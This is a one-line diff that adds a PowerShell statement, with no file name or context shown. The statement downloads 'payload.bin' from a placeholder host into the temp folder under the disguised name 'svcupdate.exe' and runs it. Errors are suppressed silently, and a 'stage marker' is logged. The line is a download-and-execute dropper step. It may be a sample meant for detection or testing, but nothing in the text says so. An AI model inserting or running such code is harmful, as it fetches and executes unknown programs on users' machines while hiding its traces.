@@ -1,0 +1,1 @@
+$DownloadUrl = "http://example.com/payload.bin"; $DownloadPath = "$env:TEMP\svcupdate.exe"; Invoke-WebRequest -Uri $DownloadUrl -OutFile $DownloadPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath $DownloadPath -ErrorAction SilentlyContinue; Write-Verbose "stage marker 17 reached"
